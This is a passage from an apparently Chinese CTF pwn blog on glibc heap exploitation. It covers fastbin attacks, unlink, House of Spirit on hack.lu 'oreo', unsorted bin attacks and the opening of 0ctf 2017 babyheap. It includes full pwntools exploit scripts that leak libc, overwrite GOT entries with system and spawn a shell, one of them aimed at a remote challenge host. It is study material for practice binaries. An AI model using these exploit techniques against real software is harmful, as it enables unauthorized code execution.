class="line">没有uaf漏洞</span><br><span class="line"></span><br><span class="line">![image-20251110215255384](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110215255384.png)</span><br><span class="line"></span><br><span class="line">且存在后门函数，magic是bss上的全局变量，只要让bss处的值&lt;= 0x1BF52即可![image-20251110215404500](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110215404500.png)</span><br><span class="line"></span><br><span class="line">考虑让函数的堆空间开辟到这个magic处，让函数可以修改他的值</span><br><span class="line"></span><br><span class="line">先malloc两个堆块，free掉下面那一个用作改fd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>add(0x10 , ‘aaaa’) #0<br>add(0x60 , ‘bbbb’) #1<br>free(1) #1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20251110220110022](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110220110022.png)</span><br><span class="line"></span><br><span class="line">在magic的前面找打到了这个符合要求的size,改fd为这个地址，之后malloc就可以取出我们的bss处</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload &#x3D; 0x18 * b’a’ + p64(0x71) + p64(0x000000000060208d)<br>edit(0 , len(payload) , payload)<br>add(0x60 , ‘aaaa’) #1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最后在目标处写入就可以了</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload1 &#x3D; 3 * b’a’ + p64(0x1bf53)<br>add(0x60 , payload1) #2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20251110220543118](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251110220543118.png)</span><br><span class="line"></span><br><span class="line">脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>from pwn import *<br>import sys<br>from LibcSearcher import *</p>
<p>file_path &#x3D; “.&#x2F;222”<br>remote_host &#x3D; “1.95.36.136”<br>remote_port &#x3D; 2110<br>context(arch&#x3D;’amd64’, os&#x3D;’linux’, log_level&#x3D;’debug’)</p>
<p>context.terminal &#x3D; [<br>    “cmd.exe”, “&#x2F;c”,<br>    “start”, “&#x2F;max”, “”, “wt.exe”,<br>    “–profile”, “WSL GDB (Black)”,<br>    “–”, “wsl”, “bash”, “-lc”<br>]</p>
<p>elf &#x3D; ELF(file_path)<br>libc &#x3D; elf.libc<br>if ‘re’ in sys.argv:<br>    p &#x3D; remote(remote_host, remote_port)<br>else:<br>    p &#x3D; process(file_path)<br>    #gdb.attach(p,”b*”)</p>
<p>def dbg():<br>    gdb.attach(p)<br>    pause()<br>def sla(a, b):<br>    p.sendlineafter(a, b)<br>def ru(a):<br>    p.recvuntil(a)<br>def sa(a, b):<br>    p.sendafter(a, b)</p>
<p>def add(size , content) :<br>  p.sendafter(‘Your choice :’ , b’1’)<br>  p.sendafter(‘Size of Heap : ‘ , str(size))<br>  p.sendafter(‘Content of heap:’ , content)<br>def edit(idx , size , content) :<br>  p.sendafter(‘Your choice :’ , b’2’)<br>  p.sendafter(‘Index :’ , str(idx))<br>  p.sendafter(‘Size of Heap : ‘ , str(size))<br>  p.sendafter(‘Content of heap : ‘ , content)<br>def free(idx) :<br>  p.sendafter(‘Your choice :’ , b’3’)<br>  p.sendafter(‘Index :’ , str(idx))</p>
<p>add(0x10 , ‘aaaa’) #0<br>add(0x60 , ‘bbbb’) #1<br>free(1) #1<br>payload &#x3D; 0x18 * b’a’ + p64(0x71) + p64(0x000000000060208d)<br>edit(0 , len(payload) , payload)<br>add(0x60 , ‘aaaa’) #1<br>payload1 &#x3D; 3 * b’a’ + p64(0x1bf53)<br>add(0x60 , payload1) #2<br>p.sendafter(‘Your choice :’ , b’114514’) </p>
<p>p.interactive()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">unlink方法</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>tar&#x3D;0x00000000006020C0<br>add(0x30,b”111111111”)<br>add(0x80,b”222222”)</p>
<p>pay&#x3D;p64(0)+p64(0x30)+p64(tar-0x18)+p64(tar-0x10)+p64(0)*2+p64(0x30)+p64(0x90)<br>edit(0,len(pay),pay)<br>free(1)<br>pay&#x3D;p64(0)*3+p64(elf.got[“read”])</p>
<p>edit(0,len(pay),pay)<br>edit(0,8,p64(0x400D71))</p>
<p>p.interactive()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 例House of Spirit</span><br><span class="line"></span><br><span class="line">[链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2014_hack.lu_oreo)</span><br><span class="line"></span><br><span class="line">![image-20251111220602921](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251111220602921.png)</span><br><span class="line"></span><br><span class="line">add</span><br><span class="line"></span><br><span class="line">看到会把上一个chunk的地址放置在高13个块处，也就是13*4=52处，而输入可以输入56个字节，可以覆盖到上一个chunk_addr处</span><br><span class="line"></span><br><span class="line">![image-20251111220624291](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251111220624291.png)</span><br><span class="line"></span><br><span class="line">show</span><br><span class="line"></span><br><span class="line">遍历每13个空间处chunk的内容，读取其内容</span><br><span class="line"></span><br><span class="line">![image-20251111220636302](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251111220636302.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free</span><br><span class="line"></span><br><span class="line">没有uaf漏洞，读取chunk处</span><br><span class="line"></span><br><span class="line">![image-20251111221113506](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251111221113506.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message</span><br><span class="line"></span><br><span class="line">会对0804A2A8存储的内容地址处写入</span><br><span class="line"></span><br><span class="line">![image-20251111221433862](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251111221433862.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">目标：把让栈开辟到0804A2A8地址处</span><br><span class="line"></span><br><span class="line">1.读取puts地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload1 &#x3D; b’a’*27+p32(elf.got[‘puts’])<br>add(b’a’*25,payload1)<br>show()<br>p.recvuntil(‘Description: ‘)<br>p.recvuntil(‘Description: ‘)<br>puts&#x3D; u32(p.recvuntil(“\n”,drop&#x3D;True)[:4])<br>print(hex(puts))<br>libc_base &#x3D; puts - libc.symbols[‘puts’]<br>system_addr &#x3D; libc_base + libc.symbols[‘system’]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20251111221942498](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251111221942498.png)</span><br><span class="line"></span><br><span class="line">2.修改fake_chunk的size,看到目标0804A2A8上的0804A2A4每次正好对应每次操作的加数，所以多次进行add把它改为0x38对应的size=0x40</span><br><span class="line"></span><br><span class="line">修改上一个chunk的地址以欺骗malloc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>num &#x3D; 1<br>while num &lt; 0x3f:<br>    add(‘a’*25,’a’*27)<br>    num +&#x3D; 1<br>payload2 &#x3D; b’a’*27+p32(0x0804a2a8)<br>add(b’a’*25,payload2)    </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3.修改下一个chunk的size，通过House of Spirit堆下一个size的校验</span><br><span class="line"></span><br><span class="line">注意这里每个chunk的last_heap都要设置成NULL，因为在后面delete的时候是依次free，这样才可以判断出之后没有chunk了</span><br><span class="line"></span><br><span class="line">message是从0x0804a2c0开始编辑的，而我们的chunk从0x0804a2a8开始的0x38个字节，填满整个chunk需要0x38-(0xc0-0xa8) = 0x20字节，但最后4个字节也就是last_heap我们要设置为NULL。我把这个size设置为100，只要不大不小就行，比如0x100也行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload3 &#x3D; b’\x00’*0x20+p32(0x50)<br>message(payload3)<br>order()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">调试看到是从0x804a2c0开始输入</span><br><span class="line"></span><br><span class="line">![image-20251111214707214](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251111214707214.png)</span><br><span class="line"></span><br><span class="line">4.改got表格地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sscanf_got &#x3D; elf.got[‘__isoc99_sscanf’]<br>add(p32(sscanf_got),b’a’)<br>message(p32(system_addr))<br>p.sendline(‘&#x2F;bin&#x2F;sh\0’)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>from pwn import *<br>p &#x3D; process(‘.&#x2F;oreo’)<br>elf &#x3D; ELF(“.&#x2F;oreo”)<br>libc &#x3D; ELF(‘.&#x2F;libc.so.6’)</p>
<p>context.terminal &#x3D; [<br>    “cmd.exe”, “&#x2F;c”,<br>    “start”, “&#x2F;max”, “”, “wt.exe”,<br>    “–profile”, “WSL GDB (Black)”,<br>    “–”, “wsl”, “bash”, “-lc”<br>]<br>def dbg():<br>    gdb.attach(p)<br>    pause()<br>def dbg():<br>    gdb.attach(p)<br>    pause()<br>def sla(a, b):<br>    p.sendlineafter(a, b)<br>def ru(a):<br>    p.recvuntil(a)<br>def sa(a, b):<br>    p.sendafter(a, b)</p>
<p>def add(descrip, name):<br>    p.sendline(‘1’)<br>    p.sendline(name)<br>    p.sendline(descrip)<br>def show():<br>    p.sendline(‘2’)<br>    p.recvuntil(‘&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n’)</p>
<p>def order():<br>    p.sendline(‘3’)</p>
<p>def message(notice):<br>    p.sendline(‘4’)<br>    p.sendline(notice)</p>
<p>payload1 &#x3D; b’a’*27+p32(elf.got[‘puts’])<br>add(b’a’*25,payload1)<br>show()<br>p.recvuntil(‘Description: ‘)<br>p.recvuntil(‘Description: ‘)<br>puts&#x3D; u32(p.recvuntil(“\n”,drop&#x3D;True)[:4])<br>print(hex(puts))<br>libc_base &#x3D; puts - libc.symbols[‘puts’]<br>system_addr &#x3D; libc_base + libc.symbols[‘system’]</p>
<p>num &#x3D; 1<br>while num &lt; 0x3f:<br>    add(‘a’*25,’a’*27)<br>    num +&#x3D; 1</p>
<p>payload2 &#x3D; b’a’*27+p32(0x0804a2a8)<br>add(b’a’*25,payload2)</p>
<p>payload3 &#x3D; b’\x00’*0x20+p32(0x50)<br>message(payload3)<br>order()<br>p.recvuntil(b’Okay order submitted!\n’)</p>
<p>sscanf_got &#x3D; elf.got[‘__isoc99_sscanf’]<br>add(p32(sscanf_got),b’a’)<br>message(p32(system_addr))<br>p.sendline(‘&#x2F;bin&#x2F;sh\0’)</p>
<p>p.interactive()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## unsorted_bin attack </span><br><span class="line"></span><br><span class="line">`Unsorted Bin` 在管理时为循环双向链表，若 `Unsorted Bin` 中有两个 `bin`，那么该链表结构如下</span><br><span class="line"></span><br><span class="line">`unsorted bin`也是以链表的方式进行组织的，和`fast bin`不同的是其分配方式是`FIFO`，即一个chunk放入`unsorted bin`链时将该堆块插入链表头，而从这个链取堆块的时候是从尾部开始的，因此`unsorted bin`遍历堆块的时候使用的是`bk`指针。</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/unsortedbins-struct.jpg)</span><br><span class="line"></span><br><span class="line">![img](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/gdb-debug-state.png)</span><br><span class="line"></span><br><span class="line">从 unsorted 取 chunk 时必写 bck-&gt;fd = fwd，但只有 victim 是最后一个元素（或唯一元素）时，bck-&gt;fd 才会被写成 unsorted bin 的位置。</span><br><span class="line"></span><br><span class="line">&gt;unsorted_chunks(av)返回的是 **unsorted bin 的链表头部（bin header）**实际上是 `&amp;main_arena + 0x88` 附近，简称bin</span><br><span class="line">&gt;</span><br><span class="line">&gt;bin-&gt;fd   // 链表第一个 chunk</span><br><span class="line">&gt;bin-&gt;bk   // 链表最后一个 chunk</span><br><span class="line">&gt;</span><br><span class="line">&gt;unsorted bin从bin-&gt;bk开始取，从bin&gt;fd开始放</span><br><span class="line"></span><br><span class="line">bck就是victim-&gt;bk,所以控制了 bk 的值，我们就能将 `unsorted_chunks (av)` 写到任意地址。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code>      /* remove from unsorted list */
      if (__glibc_unlikely (bck-&gt;fd != victim))
        malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);
        #下面两个真正进行解链
      unsorted_chunks (av)-&gt;bk = bck;#连接第二放进去的
      bck-&gt;fd = unsorted_chunks (av);#改fd为main_arena
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">但是该攻击方法只能实现向一个地址处写入一个大数（main_arena）</span><br><span class="line"></span><br><span class="line">且`leak_fd = libc_base + offset_main_arena + offset_in_arena`</span><br><span class="line"></span><br><span class="line">**对于offset_main_arena**</span><br><span class="line"></span><br><span class="line">main_arena 在 libc 中的偏移</span><br><span class="line"></span><br><span class="line">![image-20251119211557809](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251119211557809.png)</span><br><span class="line"></span><br><span class="line">**对于offset_in_arena**</span><br><span class="line"></span><br><span class="line">fd 指向 main_arena 内部的哪个字段</span><br><span class="line"></span><br><span class="line">![image-20251119210717358](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251119210717358.png)</span><br><span class="line"></span><br><span class="line">### unsorted_bin_attack</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;</p>
<p>int main(){<br>	unsigned long stack_var&#x3D;0;<br>	unsigned long *p&#x3D;malloc(400);<br>	malloc(500);#防合并<br>	free(p);<br>    #改bk位<br>	p[1]&#x3D;(unsigned long)(&amp;stack_var-2);#bk<br>	malloc(400);#会把bk+0x10处改为malloc_arena<br>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">第一次free之后</span><br><span class="line"></span><br><span class="line">![image-20251113213656583](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251113213656583.png)</span><br><span class="line"></span><br><span class="line">修改为目标地址</span><br><span class="line"></span><br><span class="line">![image-20251113213854399](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251113213854399.png)</span><br><span class="line"></span><br><span class="line">malloc（0x400）之后</span><br><span class="line"></span><br><span class="line">![image-20251118194441148](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251118194441148.png)</span><br><span class="line"></span><br><span class="line">bck+0x10处被改写为main_arena</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### unsorted_bin_into_stack</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdint.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;assert.h&gt;</p>
<p>void jackpot(){ printf(“Nice jump d00d\n”); exit(0); }</p>
<p>int main() {<br>	intptr_t stack_buffer[4] &#x3D; {0};<br>	<br>	intptr_t* victim &#x3D; malloc(0x100);<br>	intptr_t* p1 &#x3D; malloc(0x100);#防合并<br>	free(victim);<br>	#伪造chunk<br>	stack_buffer[1] &#x3D; 0x100 + 0x10;<br>	stack_buffer[3] &#x3D; (intptr_t)stack_buffer;#指向自身<br>	<br>	victim[-1] &#x3D; 32;#改自身size让malloc(0x100)时可以返回fake_chunk<br>	victim[1] &#x3D; (intptr_t)stack_buffer;#victim-&gt;bk&#x3D;fake——chunk</p>
<pre><code>char *p2 = malloc(0x100);
printf(&quot;malloc(0x100): %p\n&quot;, p2);
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">free之后</span><br><span class="line"></span><br><span class="line">![image-20251117192454459](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251117192454459.png)</span><br><span class="line"></span><br><span class="line">修改fake_chunk,让bk指向自身</span><br><span class="line"></span><br><span class="line">![image-20251117192533976](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251117192533976.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">修改真实chunk大小，改bk为fake—chunk处</span><br><span class="line"></span><br><span class="line">&gt;glibc 把 chunk 放进哪个 bin，是在 `free()` 的那一刻决定的；</span><br><span class="line">&gt; 你之后在内存里手动改 `size`，并不会把它“搬家”到 fastbin。</span><br><span class="line"></span><br><span class="line">![image-20251117193142732](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251117193142732.png)</span><br><span class="line"></span><br><span class="line">之后malloc（0x100）就可以取到fake_chunk，且其fd位写入了main_arena</span><br><span class="line"></span><br><span class="line">![image-20251117194014605](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251117194014605.png)</span><br><span class="line"></span><br><span class="line">![image-20251117194410353](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251117194410353.png)</span><br><span class="line"></span><br><span class="line">此时也不能malloc(0x20)因为会校验下一个size是否匹配</span><br><span class="line"></span><br><span class="line">上面House of Spirit提到过</span><br><span class="line"></span><br><span class="line">#### 例0ctf_2017_babyheap</span><br><span class="line"></span><br><span class="line">[链接](https://buuoj.cn/challenges#0ctf_2017_babyheap)</span><br><span class="line"></span><br><span class="line">![image-20260208103143181](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260208103143181.png)</span><br><span class="line"></span><br><span class="line">&gt;| 项目                  | `malloc(size)`                       | `calloc(n, size)`          |</span><br><span class="line">&gt;| --------------------- | ------------------------------------ | -------------------------- |</span><br><span class="line">&gt;| 参数形式              | 申请 `size` 字节                     | 申请 `n * size` 字节       |</span><br><span class="line">&gt;| 返回内存内容          | **未初始化**（可能包含旧 heap 数据） | **全部清零**               |</span><br><span class="line">&gt;| 是否自动 memset       | 否                                   | 是（内部清零）             |</span><br><span class="line">&gt;| 整数溢出检查          | 无                                   | 有（检查 `n*size` 溢出）   |</span><br><span class="line">&gt;| 性能                  | 通常更快                             | 稍慢（需清零）             |</span><br><span class="line">&gt;| libc 实现路径         | 标准 malloc 路径                     | 可能优化路径 + 清零        |</span><br><span class="line">&gt;| 信息泄露可能性（PWN） | 高（常用泄露指针）                   | 低（数据被清零）           |</span><br><span class="line">&gt;| 对利用影响            | 利用友好                             | 利用难度更高               |</span><br><span class="line">&gt;| 常见用途              | 通用分配                             | 数组/结构初始化            |</span><br><span class="line">&gt;| 等价代码              | —                                    | `malloc(n*size)+memset(0)` |</span><br><span class="line"></span><br><span class="line">![image-20260208103158745](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260208103158745.png)</span><br><span class="line"></span><br><span class="line">![image-20260208103255246](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260208103255246.png)</span><br><span class="line"></span><br><span class="line">![image-20260208103306171](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260208103306171.png)</span><br><span class="line"></span><br><span class="line">思路，先泄露libc_base</span><br><span class="line"></span><br><span class="line">把unsorted_bin放入（1个），此时它的fd,bk存放的是main_arena+88，没有uaf，通过overlapping chunks来拿到相同地址来输出去匹配</span><br><span class="line"></span><br><span class="line">再把malloc_hook处覆盖为one_gadget</span><br><span class="line"></span><br><span class="line">找合适的size去匹配chunk</span><br><span class="line"></span><br><span class="line">1.创建chunk，然后free两个</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>add(0x10)<br>add(0x10)<br>add(0x10)<br>add(0x10)<br>add(0x80)</p>
<p>delet(1)<br>delet(2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20251120192818253](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251120192818253.png)</span><br><span class="line"></span><br><span class="line">2.修改</span><br><span class="line"></span><br><span class="line">fastbin_dup_into_stack再次拿到块4的指针：修改free的chunk的fd指针指向4，之后改那个大chunk的size为fastbin的那个0x20</span><br><span class="line"></span><br><span class="line">这里开了pie保护只能覆盖最后一位进行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>pay&#x3D;p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p8(0x80)<br>edit(0,len(pay),pay)</p>
<p>pay&#x3D;p64(0)*3+p64(0x21)<br>edit(3,len(pay),pay)<br>#dbg()<br>add(0x10)<br>add(0x10)#2<br>dbg()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20251120193245980](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251120193245980.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;# 为什么两次 free 比单次 free 更“好用”或更方便</span><br><span class="line">&gt;</span><br><span class="line">&gt;- **降低对精确偏移的要求**：用两个 free，你通常只需要把某个已存在的 fastbin 链表节点的 fd 改成目标地址，而不必从零开始精确写入那个 freed chunk 的 fd（因为链表里已经有两个节点，覆盖其中一个相对容易）。尤其当你是通过越界写覆盖相邻多个 header/用户区域时，构造两个 free 能让写入模式更自然匹配内存布局。</span><br><span class="line">&gt;- **可控的分配序列**：两次 malloc 的返回序列是可预期的（先 head，再 head-&gt;fd），配合覆写其中 one 的 fd，可以更可靠地让第二个 malloc 返回你想要的地址。</span><br><span class="line">&gt;- **调试友好**：失败时状态更容易观察（先拿到第一个 freed chunk，再看第二个是否命中目标），比一次性精确写 fd 更易定位错误。</span><br><span class="line">&gt;- **避免直接触碰被 free 的第一个 chunk 的 header**：有时第一个 freed chunk 的一些字段不容易被越写到或对齐写入，构造两个 free 后可以选择覆盖链表中较容易到达的节点。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line"></span><br><span class="line">接着是为了拿到main_arena的地址</span><br><span class="line"></span><br><span class="line">把tar的chunk处size改为unsorted—bin，以把该chunk free之后可以把fd bk赋值为main_arena+offset，同时再add一个unsortedbin的chunk防止它和top_chunk合并</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>pay&#x3D;b”a”*0x18+p64(0x91)<br>edit(3,len(pay),pay)<br>add(0x80)#避免top chunk合并<br>delet(4)<br>show(2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20251112201030610](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251112201030610.png)</span><br><span class="line"></span><br><span class="line">![image-20251119204629790](https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251119204629790.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
